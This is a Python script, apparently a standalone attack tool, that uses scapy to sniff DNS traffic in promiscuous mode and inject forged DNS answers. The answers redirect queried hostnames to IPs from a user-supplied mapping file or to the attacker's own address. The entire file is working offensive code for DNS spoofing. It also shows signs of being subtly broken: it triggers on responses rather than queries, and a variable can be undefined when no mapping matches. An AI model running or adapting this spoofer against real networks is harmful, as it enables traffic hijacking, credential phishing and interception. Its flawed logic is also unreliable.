from scapy.all import *
from scapy.all import send as ssend
import netifaces as ni

conf.sniff_promisc=True
addr='127.0.0.1'
interface='en0'
hostnames_there=False
dns_holder = dict()
def inject_packet(pkt):
    global interface,addr,hostnames_there
    
    #A response and no error
    if pkt.getlayer(DNS).qr == 1 and pkt[DNS].opcode == 0:     
        query = pkt[DNS].qd
        pkt[UDP].chksum = None
        inmap = False
        for e in dns_holder.keys():#because query.qname has to be decoded
            if bytes(e.encode()) == query.qname:
                inmap = True
                newqname = e

        print("Found Query Hostname: ",newqname)
        if hostnames_there and inmap: #matches with a host from hostnames
            spoofip = dns_holder[newqname]
            print("Conjuring Spoof Packet with ip --->",spoofip)
        else:#use local machine ip
            spoofip = addr
        inject_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qd=query,qr=1,aa=0,rcode=0, an=DNSRR(rrname=query.qname,ttl=350, rdata=spoofip))
        send(inject_packet, iface=interface)
        print('Whats in the packet?', inject_packet.summary())

def main():
    global interface, addr, hostnames_there
    interface = ni.gateways()['default'][ni.AF_INET][1] #default interface
    addr = ni.ifaddresses(str(interface))[ni.AF_INET][0]['addr'] #default ip address
    command = sys.argv #command line 
    if "-h" in command:
        hostnamefile = command[command.index("-h")+1]
        hostnames_there = True

    if "-i" in command:
        interface = command[command.index("-i")+1]

    if hostnames_there:
        hf = open(hostnamefile, "r")
        for line in hf: #insert key pair
            ip_host = line.split(',')
            dns_holder[ip_host[1].strip()+"."] = str(ip_host[0]).strip()
    print("Current Interface: "+str(interface))
    print("Sniffing has begun...")
    sniff(iface = interface,filter = 'port 53', prn = inject_packet, store = 0)
if __name__ == "__main__":
    main()

